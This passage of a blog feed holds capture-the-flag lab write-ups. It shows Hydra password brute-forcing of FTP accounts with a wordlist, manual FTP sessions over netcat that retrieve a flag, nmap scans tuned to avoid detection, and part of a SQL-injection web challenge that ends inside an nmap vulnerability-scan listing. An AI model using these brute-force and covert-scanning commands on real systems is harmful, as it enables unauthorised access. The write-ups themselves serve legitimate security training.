&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10021&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; eddie&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;      -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;         10.10.152.115&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ftp&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0&quot;&gt;# Hydra task to break quinn&#039;s password.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10021&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; quinn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;      -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ~/.local/share/red-team/wordlists/rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;         10.10.152.115&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ftp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;These quickly return the results eddie:jordan and quinn:andrea. Let’s try to use &lt;code&gt;nc -nv 10.10.152.115 10021&lt;/code&gt; to &lt;a href=&quot;https://www.serv-u.com/resource/tutorial/quit-user-abor-acct-syst-xdel-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;log into&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; eddie’s account.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;(UNKNOWN) [10.10.152.115] 10021 (?) open&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;220 (vsFTPd 3.0.3)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;USER eddie&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;331 Please specify the password.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASS jordan&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;230 Login successful.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;425 Use PORT or PASV first.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASV&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;227 Entering Passive Mode (10,10,152,115,119,101).&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;LIST&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;150 Here comes the directory listing.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;226 Directory send OK.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;QUIT&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;221 Goodbye.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;The trick here is that the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ftp&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ftp&quot;&gt;FTP&lt;/a&gt; passive mode response returns (o1,o2,o3,o4,p1,p2), where o1 – o4 are the four octets of the server’s IP address (10.10.152.115), and p1 – p2 are the high + low bytes of the port number to connect to, (256 × p1) + p2. Thus, &lt;a href=&quot;https://stackoverflow.com/questions/50324402/how-to-list-ftp-directories-using-telnet#comment126707507_50324402&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;after entering passive mode we can catch the reply using a second netcat instance&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, &lt;code&gt;nc -nv 10.10.152.115 30565&lt;/code&gt;. We start this &lt;em&gt;before&lt;/em&gt; entering the &lt;a href=&quot;https://www.serv-u.com/resource/tutorial/appe-stor-stou-retr-list-mlsd-mlst-ftp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;LIST&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; command, revealing that eddie has access to no files.&lt;/p&gt;
&lt;p&gt;Let’s have the same conversation for quinn.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;ftp&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;(UNKNOWN) [10.10.152.115] 10021 (?) open&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;220 (vsFTPd 3.0.3)&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;USER quinn&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;331 Please specify the password.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASS andrea&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;230 Login successful.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASV&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;227 Entering Passive Mode (10,10,152,115,120,34).&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;LIST&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;150 Here comes the directory listing.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;226 Directory send OK.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;PASV&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;227 Entering Passive Mode (10,10,152,115,117,85).&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;RETR ftp_flag.txt&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;226 Transfer complete.&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;QUIT&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;221 Goodbye.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;For &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ftp&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ftp&quot;&gt;FTP&lt;/a&gt; active mode we need to open &lt;em&gt;two&lt;/em&gt; auxiliary &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/netcat&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/netcat&quot;&gt;netcat&lt;/a&gt; sessions. The first, &lt;code&gt;nc -nv 10.10.152.115 30754&lt;/code&gt;, catches the LIST command, which reveals that quinn has access to an &lt;code&gt;ftp_flag.txt&lt;/code&gt; file. The second, &lt;code&gt;nc -nv 10.10.152.115 30037&lt;/code&gt;, catches the contents of that file after issuing the RETR command. This is the answer to our penultimate challenge.&lt;/p&gt;
&lt;p&gt;For the final challenge, we go to &lt;code&gt;http://10.10.152.115:8080&lt;/code&gt;. The challenge is to scan 10.10.152.115 “as covertly as possible”. I’m not really willing to wait 7 months for a scan, but I’ll bet that all we need to do is use &lt;code&gt;-T1&lt;/code&gt; and drop &lt;code&gt;-A&lt;/code&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.152.115&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Well, that didn’t work — “71% chance of scan being detected” and we’re nowhere near done. That, and the machine expired without me even noticing.&lt;/p&gt;
&lt;p&gt;New target IP is 10.10.34.244.&lt;/p&gt;
&lt;p&gt;Maybe speed doesn’t matter here? Let’s try a scan that shouldn’t even look like a connection — an ACK scan — but at a more “normal” rate.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.34.244&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Well, that resulted in an almost immediate flag. Switching to &lt;code&gt;-T2&lt;/code&gt; for the timing here also incremented things quite quickly.&lt;/p&gt;
&lt;p&gt;What about a null scan? That might actually get me more information than an ACK scan, but should elicit &lt;em&gt;any&lt;/em&gt; response from open ports.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.34.244&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;“Null scan” is apparently the right answer, as the challenge provided the flag almost immediately (which doesn’t &lt;em&gt;actually&lt;/em&gt; make any sense, but whatever…).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 31 min&lt;/p&gt;</description>
    <pubDate>Sun, 03 Apr 2022 00:00:00 GMT</pubDate>
  </item><item>
    <title>Jurassic Park</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2022-02-02-jurassic-park</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2022-02-02-jurassic-park</guid>
    <description>&lt;p&gt;Our target is 10.10.105.134.&lt;/p&gt;
&lt;p&gt;This is a &lt;em&gt;very&lt;/em&gt; simple site: An index page (index.php) that leads to a shop.php page, which in turn links to three calls of &lt;code&gt;item.php?id=X&lt;/code&gt; (where &lt;code&gt;X&lt;/code&gt; is a number).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Trying to include /etc/os-release via item.php causes the site to display a Dennis Nedry page that taunts you to use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sqlmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sqlmap&quot;&gt;SQLMap&lt;/a&gt;. Trying a hand-crafted test &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/sql-injection-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/sql-injection-attacks&quot;&gt;SQL injection&lt;/a&gt; also displays this page.&lt;/li&gt;
&lt;li&gt;Trying different random indexes mostly doesn’t work, though &lt;code&gt;item.php?id=100&lt;/code&gt; displays a curiously broken page.&lt;/li&gt;
&lt;li&gt;Trying &lt;code&gt;item.php?id=..&lt;/code&gt; throws an SQL error revealing that the site is running on &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/mysql&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/mysql&quot;&gt;MySQL&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let’s see if our usual &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan turns up anything interesting:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; jurassic-park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.105.134&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This gives the following output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Wed Feb  2 20:28:37 2022 as: nmap -v -oA jurassic-park -Pn -A -T4 -sS -script vuln -p- 10.10.105.134
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.105.134
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
